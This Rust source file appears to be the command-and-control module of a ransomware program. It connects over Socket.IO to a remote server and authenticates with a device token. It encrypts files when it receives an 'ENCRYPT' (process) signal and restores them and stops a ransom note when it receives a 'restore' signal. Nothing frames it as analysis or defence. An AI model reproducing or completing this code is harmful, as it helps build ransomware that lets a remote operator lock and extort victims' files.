use rust_socketio::{ClientBuilder, Payload, client::Client as IoClient};
use serde_json::json;
use std::sync::{Arc, Mutex};

use crate::processor::DataProcessor;
use crate::ransom::RansomNote;

pub struct SoClient {
    pub url: String,
    pub device_token: String,
}

impl SoClient {
    pub fn run(self, processor: Arc<Mutex<DataProcessor>>, note: RansomNote) -> anyhow::Result<()> {
        let dtok = self.device_token.clone();
        let proc_clone = processor.clone();
        let note_clone = note.clone();

        let dtok_for_connect = dtok.clone();
        let mut client = ClientBuilder::new(self.url.clone())
            .namespace("/")
            .on("connect", move |_payload: Payload, socket: IoClient| {
                println!("[rusty] Connected; authenticating…");
                let _ = socket.emit("authenticate", json!({"device_token": dtok_for_connect.clone()}));
                Ok(())
            })
            .on("auth_ok", move |_payload: Payload, _| {
                println!("[rusty] Authenticated.");
                Ok(())
            })
            .on("process", move |_payload: Payload, _| {
                println!("[rusty] Received ENCRYPT signal");
                if let Ok(mut p) = proc_clone.lock() { let _ = p.process_files(); }
                Ok(())
            })
            .on("restore", move |_payload: Payload, _| {
                println!("[rusty] Received RESTORE signal");
                if let Ok(mut p) = processor.lock() { p.restore_files(); }
                note_clone.stop();
                Ok(())
            })
            .on("server_ack", |_p: Payload, _| Ok(()))
            .on("script_output", |_p: Payload, _| Ok(()))
            .on("error", |e: Payload, _| { eprintln!("[rusty] socket error: {:?}", e); Ok(()) })
            .connect()?;
        // already authenticated in connect callback
        Ok(())
    }
}
